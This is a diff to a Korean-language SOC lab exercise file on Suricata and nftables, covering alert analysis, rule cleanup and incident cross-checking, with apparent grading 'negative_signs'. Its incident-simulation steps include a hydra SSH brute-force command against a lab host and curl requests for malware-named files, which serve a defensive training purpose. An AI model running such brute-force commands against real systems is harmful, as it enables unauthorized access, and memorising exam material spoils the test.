+          sudo jq -r 'select(.alert.signature_id==1000201) | [.timestamp, .src_ip, .http.url] | @tsv' /var/log/suricata/eve.json | tail
+          # 3. URL 변형 통계 (어떤 경로로 .exe 다운로드 시도)
+          sudo jq -r 'select(.alert.signature_id==1000201) | .http.url' /var/log/suricata/eve.json | sort | uniq -c | sort -rn
+          # 4. 시간대 별 분포
+          sudo jq -r 'select(.alert.signature_id==1000201) | .timestamp[0:13]' /var/log/suricata/eve.json | sort | uniq -c
+        예상 출력 `2026-05-06T14:23:00 / 10.20.30.201 / /malware.exe / 5 /malware.exe / 3 /trojan.exe`.
+        운영 해석: SOC 분석 1차 도구. URL 변형 = 공격자 도구 fingerprinting.
+      - |
+        **[OSS] evebox (alert detail + escalate)** — UI 표준.
+          # 1. evebox 접속 (http://localhost:5636)
+          # 2. UI 검색
+          # alert.signature_id:1000201
+          # 3. alert detail
+          # - timestamp
+          # - src/dst IP
+          # - http.url
+          # - flow context
+          # 4. CLI 검색
+          evebox-cli search "alert.signature_id:1000201" --max-events 10
+          # 5. "Escalate" 버튼 → 다른 분석가 review 요청
+        UI 동작: alert hunt + 협업 워크플로우.
+        운영 해석: 단일 alert 외 *공격 컨텍스트* 분석. SOC 표준.
+      - |
+        **[OSS] Wazuh dashboard (Suricata + SIEM 통합)** — multi-source.
+          # 1. Wazuh manager 가 eve.json 자동 수집
+          sudo cat /etc/wazuh-manager/local_decoder.xml | grep suricata
+          # 2. https://10.20.30.100/app/wazuh#/overview/?tab=general
+          # 3. KQL 검색
+          # rule.groups: "suricata" and rule.description: "*malware*"
+          # 4. Modules → Suricata → top alerts
+        UI 동작: Suricata + Wazuh 통합 dashboard.
+        운영 해석: 단일 IDS 외 *전체 보안 stack* 통합. SOC NOC 표준.
+      - |
+        **[OSS] suricatasc dump-counters (alert 메트릭)** — 런타임.
+          # 1. 룰별 매칭 통계
+          sudo suricatasc -c "dump-counters" 2>&1 | jq '.message' | grep -iE "alert|drop|detect"
+          # 2. 1000201 적재 검증
+          sudo suricatasc -c "ruleset-stats" | jq '.message.rules_per_loaded[] | select(.sid==1000201)'
+          # 3. 시간 별 alert 수 변화
+          while true; do
+              count=$(sudo suricatasc -c "dump-counters" 2>&1 | jq -r '.message["detect.alert"]')
+              echo "$(date +%H:%M:%S): alerts=$count"
+              sleep 5
+          done | head
+        예상 출력 `detect.alert: 1450 / sid 1000201: loaded / matches: 12`.
+        운영 해석: alert 0 시 룰 자체 미적재 vs 트래픽 미도달 구분. metric 기반 trouble shoot 표준.
       negative_signs:
       - 0 count 정상 판정
       - 다른 sid 확인
@@ -455,6 +1041,79 @@ steps:
       - sudo nft flush ruleset && git checkout /etc/suricata/rules/
       - 3 명령 각각 실행(에러 독립 처리)
       - snapshot 복구 또는 infrastructure-as-code reload
+      - |
+        **[OSS] && 순차 cleanup (3 단계)** — 표준.
+          # 1. nft + Suricata + reload 순차
+          sudo nft delete table inet exam && \
+            sudo sed -i '/sid:1000201/d' /etc/suricata/rules/local.rules && \
+            sudo systemctl reload suricata
+          # 2. 검증
+          sudo nft list tables | grep -c exam   # 0 = OK
+          sudo grep "sid:1000201" /etc/suricata/rules/local.rules   # 출력 없음 = OK
+          sudo suricatasc -c "ruleset-stats" | jq '.message.loaded'
+        예상 출력 `0 / (no output) / 30000` (룰 1 줄어듦).
+        운영 해석: && 로 순차 보장. 첫 명령 실패 시 두 번째 skip = 안전.
+      - |
+        **[OSS] Ansible (IaC cleanup)** — 자동화.
+          # playbook
+          - name: Cleanup exam table + sid:1000201
+            block:
+              - community.general.nftables_table:
+                  name: exam
+                  family: inet
+                  state: absent
+              - ansible.builtin.lineinfile:
+                  path: /etc/suricata/rules/local.rules
+                  regexp: '.*sid:1000201.*'
+                  state: absent
+                  validate: 'suricata -T -S %s'
+              - ansible.builtin.systemd:
+                  name: suricata
+                  state: reloaded
+          # 실행
+          ansible-playbook -i inventory.yml exam-cleanup.yml --diff
+        예상 출력 `changed: [secu] / removed: exam table / removed: sid:1000201 / reloaded: suricata`.
+        운영 해석: 다중 host 일관 cleanup. validate 로 안전성 보장.
+      - |
+        **[OSS] etckeeper (cleanup audit)** — git history.
+          # 1. cleanup 전 commit
+          sudo etckeeper commit "before exam cleanup"
+          # 2. cleanup 실행
+          sudo nft delete table inet exam
+          sudo sed -i '/sid:1000201/d' /etc/suricata/rules/local.rules
+          sudo systemctl reload suricata
+          # 3. cleanup 후 commit
+          sudo etckeeper commit "Cleanup exam table + sid:1000201 (jira: SEC-1234)"
+          # 4. diff 확인
+          sudo etckeeper vcs diff HEAD~1 HEAD -- /etc/suricata/rules/local.rules
+        예상 출력 `removed line: alert http any any -> any any ... sid:1000201 ...`.
+        운영 해석: 변경 audit 표준. 누가 언제 cleanup 했는지 evidence.
+      - |
+        **[OSS] suricatasc reload-rules (무중단)** — production.
+          # 1. 룰 파일 변경
+          sudo sed -i '/sid:1000201/d' /etc/suricata/rules/local.rules
+          # 2. live reload (캡처 끊김 0)
+          sudo suricatasc -c reload-rules
+          # 3. 적재 룰 수 검증
+          sudo suricatasc -c "ruleset-stats" | jq
+          # 4. systemctl reload 와 비교
+          # systemctl reload = SIGUSR2 = suricatasc reload-rules = 동등
+        예상 출력 `{"return":"OK","message":"done"} / {"loaded":30000,"failed":0}`.
+        운영 해석: 가장 안전한 reload. systemctl restart 의 1-3초 끊김 없음.
+      - |
+        **[OSS] git revert (rule git 환경)** — 표준 rollback.
+          # 1. /etc/suricata/rules 가 git 관리 시
+          cd /etc/suricata/rules
+          sudo git log --oneline | head
+          # 2. 특정 commit 으로 rollback
+          sudo git revert HEAD --no-edit
+          # 3. Suricata reload
+          sudo systemctl reload suricata
+          # 4. 또는 git checkout 으로 즉시 복원
+          sudo git checkout HEAD -- local.rules
+          sudo systemctl reload suricata
+        예상 출력 `Revert "Add sid:1000201 rule" / [main abc123] Revert ...`.
+        운영 해석: 룰 git 관리 환경 표준. enterprise rule lifecycle.
       negative_signs:
       - table 만 삭제 (룰 남음)
       - reload 누락 (룰 여전히 로드)
@@ -554,6 +1213,81 @@ steps:
       - secu 에서 nft list table | grep counter
       - secu 에서 tail eve.json + grep
       - cross-check 표 markdown
+      - |
+        **[OSS] hydra (SSH brute incident 시뮬)** — Phase B-1.
+          # 1. 패스워드 파일
+          echo -e "a\nb\nc\nd\ne\nf\ng" > /tmp/7pwds.txt
+          # 2. 직렬 시도 (rate limit trigger)
+          hydra -l ccc -P /tmp/7pwds.txt ssh://10.20.30.1 -t 1 -W 1 -V
+          # 3. 결과 분석
+          # 5/min 통과 + 2 drop 예상
+          # 4. nft counter 검증
+          ssh ccc@10.20.30.1 "sudo nft list chain inet exam input | grep -E 'limit|drop'"
+        예상 출력 `accept +5 / drop +2`.
+        운영 해석: rate limit 의 시간 윈도우 효과 직접 측정. nft layer 에서 explicit evidence.
+      - |
+        **[OSS] curl (.exe download incident 시뮬)** — Phase B-2.
+          # 1. 다중 .exe 변형 다운로드 시도
+          for fname in malware.exe trojan.exe; do
+              curl -sS -o /dev/null -w "$fname: %{http_code}\n" "http://10.20.30.80/$fname"
+          done
+          # 2. Suricata alert 검증
+          ssh ccc@10.20.30.1 "sudo grep -c '\"signature_id\":1000201' /var/log/suricata/eve.json"
+          # 3. nft 측 (없음 예상)
+          ssh ccc@10.20.30.1 "sudo nft list table inet exam"  # input chain 미매칭
+        예상 출력 `malware.exe: 404 / trojan.exe: 404 / Suricata: 2 alert / nft: 미매칭`.
+        운영 해석: Suricata layer 에서 evidence. nft 는 application content 못 봄.
+      - |
+        **[OSS] 양쪽 로그 동시 측정 (cross-check)** — 핵심.
+          # 1. nft counter dump
+          ssh ccc@10.20.30.1 "sudo nft -j list table inet exam | jq '[.nftables[].rule | select(.expr) | {handle, counter: .counter}]'"
+          # 2. Suricata alert dump
+          ssh ccc@10.20.30.1 "sudo jq -c 'select(.event_type==\"alert\")' /var/log/suricata/eve.json | tail"
+          # 3. cross-check 표 자동 생성 (script)
+          python3 << 'EOF'
+          import json, subprocess
+          # nft 매칭 + Suricata 매칭 합성 후 markdown 생성
+          # ...
+          EOF
+        결과: 각 layer 의 evidence 분담 + 일치 여부 자동 분석.
+        운영 해석: SIEM 의 *통합 분석* 표준 워크플로우 baseline.
+      - |
+        **[OSS] Wazuh SIEM (양쪽 log 통합)** — multi-source 표준.
+          # 1. Wazuh 가 nft + Suricata + auth 모두 수집
+          # 2. 통합 대시보드
+          # https://10.20.30.100/app/wazuh#/overview
+          # 3. KQL: 두 layer evidence 동시 검색
+          # rule.groups: ("suricata" or "iptables") and (rule.description: *brute* or rule.description: *malware*)
+          # 4. timeline 분석
+          # - 14:23:00 SSH brute (nft rate limit drop)
+          # - 14:25:30 .exe download (Suricata alert)
+        UI 동작: 다중 source 통합 view. timeline + drill-down.
+        운영 해석: *각 layer 의 한계* 보완. SIEM 이 multi-layer evidence 를 단일 incident 로 묶어 분석.
+      - |
+        **[OSS] osquery (양 host 일관 query)** — 분산 분석.
+          # 1. osquery 로 양 host 일관 query
+          osqueryi "SELECT chain, target, src_ip, dst_port FROM iptables WHERE chain='INPUT' AND target='DROP';"
+          # 2. fleet manager (Kolide / Fleet) 사용
+          fleetctl query --hosts=secu --query="iptables_drops.sql"
+          # 3. log shipping
+          osqueryd --config_path=/etc/osquery/osquery.conf
+          # 4. 결과 자동 SIEM 전송 (Wazuh 통합)
+        결과: nft + Suricata + 시스템 상태 일관 query.
+        운영 해석: enterprise 분산 SOC 표준. 100+ host 의 firewall/IDS 상태 일관 측정.
+      - |
+        **[OSS] markdown table (cross-check 보고)** — 분석가 표준.
+          # cross-check.md
+          ```
+          # SSH Brute + .exe Download Cross-Check (2026-05-06)
+          | Incident | Time | nft evidence | Suricata evidence | Match? |
+          |----------|------|--------------|-------------------|--------|
+          | SSH brute (7 attempts) | 14:23:00 | accept=5, drop=2 | (none) | layer-specific |
+          | .exe download (2 attempts) | 14:25:30 | (none) | sid:1000201 ×2 | layer-specific |
+          ```
+          # pandoc 으로 PDF 변환
+          pandoc cross-check.md -o cross-check.pdf
+        결과: 분석가 보고서 표준 형식.
+        운영 해석: 인시던트 후 보고 표준. SIEM dashboard 외 *서면 보고* 형식.
       negative_signs:
       - 한 layer 만 측정 (nft 만 또는 Suricata 만)
       - cross-check 표 누락
